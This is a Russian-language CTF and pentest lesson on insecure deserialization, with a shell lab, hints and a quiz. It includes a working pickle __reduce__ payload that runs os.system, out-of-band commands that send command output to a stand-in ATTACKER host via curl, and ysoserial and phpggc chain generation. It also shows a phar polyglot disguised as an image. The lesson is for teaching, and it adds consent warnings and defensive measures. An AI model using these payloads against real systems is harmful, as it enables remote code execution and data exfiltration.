---
id: web-deserialization
title: "Небезопасная десериализация"
category: web
parent: web-ssti-advanced
difficulty: hard
order: 2
tags: [deserialization, pickle, java, php, gadget-chain, rce]
prerequisites: [web-ssti]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
estimated_minutes: 45
summary: "Как распознать небезопасную десериализацию в PHP/Java/Python/Node и построить gadget-цепочку до RCE."
lab:
  kind: shell
  title: 'Практика: pickle — от сигнатуры до RCE'
  toolset: [core, python3, curl]
  workdir: /home/student/task
  files: [task.md, cookie.txt, gen.py]
  check: 'grep -q ''nto{'' found.txt'
  hints:
    - 'Декодируй cookie: `base64 -d cookie.txt | xxd | head -2` — сигнатура `80 04` это pickle.'
    - 'Сгенерируй payload: `python3 gen.py` — скрипт возвращает `(os.system, (''cat /flag'',))` через `__reduce__`.'
    - 'Отправь blob серверу: `curl -s http://dashboard.example/ -b ''session=<вывод gen.py>''`.'
    - 'Сервер десериализует cookie и выполнит команду — в ответе будет флаг.'
---

## Вопрос, с которого всё начинается

Приложению нужно сохранить между запросами не просто строку, а целый объект — например, корзину с товарами. Тогда программисты «замораживают» объект в байты (это **сериализация**) и отдают его клиенту, а на следующем запросе «размораживают» обратно (**десериализация**).

Вопрос: что, если клиент пришлёт **свой** набор байтов? При восстановлении объекта язык может автоматически вызвать специальные методы — и если в них есть опасная логика, твои данные превращаются в выполнение кода. Сегодня разберём это на одном примере — cookie, который выглядит как закодированный объект.

## Наш пример

Есть дашборд `dashboard.example`. При входе он выдаёт cookie:

```bash
$ curl -si https://dashboard.example/login -d 'user=bob&pass=...' | grep -i set-cookie
Set-Cookie: session=gASVJgAAAAAAAACM...
```

Значение `session` — длинная строка в base64. Что внутри? Декодируем:

```bash
$ echo 'gASVJgAAAAAAAACM...' | base64 -d | xxd | head -2
00000000: 8004 9528 0000 0000 0000 8c0a 5f5f 6d61  ...(..........__ma
```

Первые байты `80 04` — сигнатура Python **pickle** (формата сериализации Python). Дальше видно `__ma...` — начало имени модуля. Мы поняли: сервер отдаёт клиенту pickle-объект и, значит, при следующем запросе его десериализует. Ключевой вопрос — **доверяет ли он этому объекту?**

## Шаг 1: что такое pickle и его «магический» метод

`pickle` — встроенный модуль Python. При десериализации (`pickle.loads`) он восстанавливает объект, а для этого вызывает у класса метод `__reduce__`. Этот метод может вернуть **вызываемый объект и аргументы** — то есть буквально «что выполнить». Классический трюк: вернуть `os.system` и строку команды.

```python
import pickle, os, base64

class Exploit:
    def __reduce__(self):
        return (os.system, ('id',))

print(base64.b64encode(pickle.dumps(Exploit())).decode())
```

Когда сервер вызовет `pickle.loads` на этом blob'е, Python выполнит `os.system('id')`. Это и есть небезопасная десериализация.

## Шаг 2: сначала безопасный детектор

Не стоит сразу стрелять командой. Сначала проверим, что канал вообще существует и что наш blob десериализуется. Поднимем свой HTTP-сервер и попросим сервер обратиться к нам:

```python
class Exploit:
    def __reduce__(self):
        return (os.system, ('curl http://ATTACKER:8080/$(id|base64)',))

# → base64-строка payload
```

```bash
$ python3 -m http.server 8080 &          # наш listener
$ PAYLOAD=$(python3 gen.py)
$ curl -s https://dashboard.example/ -b "session=$PAYLOAD"
# в логе http-сервера:
# 203.0.113.9 - - "GET /dWlkPTAocm9vdCkK HTTP/1.1" 404 -
```

Пришёл запрос с base64 от `id=0(root)` — команда выполнена на сервере. Артефакт есть, и мы подтвердили его через OOB, даже не видя ответа в браузере.

## Шаг 3: почему нельзя просто взять любой blob

Ключевое слово — **gadget chain** («цепочка гаджетов»): набор классов из библиотек, которые уже есть в приложении и которые при десериализации приводят к выполнению команды. В Python это легко (сам `pickle` умеет вызывать объекты), а в Java и PHP сложнее — там цепочку строят из готовых классов фреймворка.

Именно поэтому одна и та же техника работает по-разному:

| Язык | Сигнатура | Инструмент | Как строится |
|------|-----------|-----------|--------------|
| PHP | `O:<n>:"Class":...`, `a:<n>:{...}` | `phpggc` | готовые цепочки (Monolog, Laravel) |
| Java | `AC ED 00 05` (base64 `rO0AB`) | `ysoserial` | CommonsCollections, Spring… |
| Python | `\x80\x04` (base64 `gASV`) | ручной `pickle` | `__reduce__` |
| Node | `_$$ND_FUNC$$_function(){...}()` | `node-serialize` | IIFE |
| .NET | `AAEAAAD`, `/wEPDwUK` | `ysoserial.net` | BinaryFormatter/ViewState |

Быстрая проверка типа — одной командой:

```bash
$ echo "$BLOB" | base64 -d 2>/dev/null | xxd | head -1
# ac ed 00 05 -> Java ; 80 04 -> pickle ; 4f 3a -> PHP "O:"
```

## Шаг 4: Java — сначала URLDNS, потом цепочки

В Java объект восстанавливает `ObjectInputStream.readObject()`. Blob начинается с `AC ED 00 05` (в base64 — `rO0AB`). Сначала используем **безопасный** детектор `URLDNS`: он лишь заставляет JVM сделать DNS-запрос, который видно на коллабораторе:

```bash
$ java -jar ysoserial.jar URLDNS 'http://unique.ATTACKER' | base64 -w0
```

Пришёл DNS — десериализация есть. Только теперь перебираем RCE-цепочки по библиотекам в classpath:

```bash
$ for c in CommonsCollections1 CommonsCollections5 CommonsBeanutils1 Spring1; do
>   java -jar ysoserial.jar $c 'curl http://ATTACKER/'$c 2>/dev/null | base64 -w0 > /tmp/p_$c
>   echo "try $c"
> done
```

Цепочки `CommonsCollections1..7`, `CommonsBeanutils1`, `Spring1`, `Hibernate1`, `Groovy1` — выбор зависит от того, какие библиотеки загружены. На новых JDK и при включённом `ObjectInputFilter` часть цепочек блокируется — перебирай.

## Шаг 5: PHP и неочевидный триггер phar

В PHP сериализация — это `serialize()`/`unserialize()`, формат `O:4:"User":2:{...}`. Готовые цепочки даёт `phpggc`:

```bash
$ phpggc -l | grep -i monolog
$ phpggc Monolog/RCE1 system 'curl http://ATTACKER:8080/$(id|base64)' | base64 -w0
```

Отдельная тонкость: в PHP десериализация срабатывает **не только** при явном `unserialize()`. Метаданные **phar**-архива десериализуются при обращении к `phar://` через обычные файловые функции — `file_exists`, `getimagesize`, `fopen`:

```bash
$ phpggc -p phar -o exploit.phar Monolog/RCE1 system id
$ curl -s "https://app.example/avatar?src=phar://uploads/exploit.phar/x"
```

phar можно замаскировать под картинку (`GIF89a` в начале, расширение `.jpg`) — важен контент, а не имя. Так связка «загрузка файла + любое чтение по пути» становится RCE.

## Шаг 6: как распознать десериализацию в дикой природе

Признаки, на которые смотришь:

- **cookie или параметр в base64**, который декодируется в бинарный мусор или в `O:...`/`a:...` (PHP), `rO0AB` (Java), `\x80` (pickle);
- скрытые поля/токены, похожие на сериализованный blob;
- ошибки `unserialize()`, `ObjectInputStream`, `pickle`, поле `__VIEWSTATE` (ASP.NET).

Если blob **подписан** (HMAC) или зашифрован — сначала нужен ключ; он часто утекает в JS-файлах или конфигах.

## Что мы теперь знаем

- Десериализация восстанавливает объект из твоих данных; при этом вызываются «магические» методы (`__reduce__`, `__wakeup`, `readObject`).
- Сигнатуры: PHP `O:`/`a:`, Java `AC ED 00 05`/`rO0AB`, Python `\x80`/`gASV`.
- RCE строится через **gadget chain** — цепочку классов из библиотек приложения.
- Инструменты: `phpggc` (PHP), `ysoserial` (Java), `ysoserial.net` (.NET), ручной `pickle` (Python).
- Сначала — безопасный детектор (URLDNS, OOB `curl`), потом RCE.
- В PHP phar-триггер срабатывает даже без явного `unserialize`.
- Артефакт — вывод команды или OOB-запрос, а не «ошибка 500».

## На что смотреть дальше

- **Не путай формат данных и десериализацию кода.** Не каждый blob уязвим — нужен именно вызов десериализации твоих данных.
- **Начинай с безвредного PoC** (URLDNS/OOB), чтобы не уронить сервис некорректным blob'ом.
- **Учитывай версию и набор библиотек** — цепочка зависит от classpath; перебирай варианты.
- **Подписанный/шифрованный blob** — сначала ищи ключ (`.env`, JS, конфиг).
- **Обязательный read-back.** Подтверди выполнение по OOB-логу или `id` в шелле, прежде чем писать «RCE».
- **Только с согласия.** Готовые цепочки — реальное выполнение кода; цель должна остаться живой.

## Квиз

Проверь себя.

```quiz
- question: "Первые байты `80 04` в декодированном cookie означают:"
  options:
    - "Java-сериализацию"
    - "Python pickle"
    - "PHP serialize"
    - "PNG-картинку"
  answer: 1
  explanation: "`\\x80\\x04` — сигнатура pickle protocol 4."
- question: "Какой метод Python-pickle используется для выполнения кода?"
  options:
    - "`__init__`"
    - "`__reduce__`"
    - "`__str__`"
    - "`__len__`"
  answer: 1
  explanation: "`__reduce__` возвращает вызываемый объект и аргументы."
- question: "Для чего в ysoserial цепочка URLDNS?"
  options:
    - "Для выполнения команды"
    - "Для безопасного blind-детекта: инициирует DNS-запрос"
    - "Для чтения файла"
    - "Для шифрования"
  answer: 1
  explanation: "DNS-запрос видно на коллабораторе, код не выполняется."
- question: "Как выглядит PHP-сериализованный массив?"
  options:
    - "`[1,2]`"
    - "`a:2:{i:0;i:1;i:1;i:2;}`"
    - '`{"a":1}`'
    - "`<array>`"
  answer: 1
  explanation: "Формат `a:<n>:{...}`."
- question: "Чем опасен phar в PHP?"
  options:
    - "Он большой"
    - "Метаданные десериализуются при обращении к `phar://` через обычные файловые функции"
    - "Он шифрует файлы"
    - "Он блокирует запросы"
  answer: 1
  explanation: "RCE срабатывает без явного `unserialize()` — через `file_exists`/`getimagesize`."
```

## Куда дальше

Дальше мы разберём десериализацию конкретно в **Python** (`web-python-deser`) — тот самый формат, что мы видели в cookie, — и покажем, как из `__reduce__` собирать стабильные payload'ы. А пока главное запомни: если сервер **восстанавливает объект из твоих байтов**, он может выполнить твой код.

## Где пригодится

- **CTF (Web):** десериализация — «тяжёлый» класс задач на RCE; часто флаг берётся готовой цепочкой phpggc/ysoserial.
- **Bug bounty:** небезопасная десериализация редка, но оплачивается как critical; ценна тем, что уникальна.
- **Пентест:** тестирование любых blob-ов (cookies, токены, ViewState) — обязательный пункт для RCE-охоты.
- **Работа (AppSec):** запрет нативной десериализации недоверенных данных, подпись/шифрование blob, обновление библиотек — меры защиты.
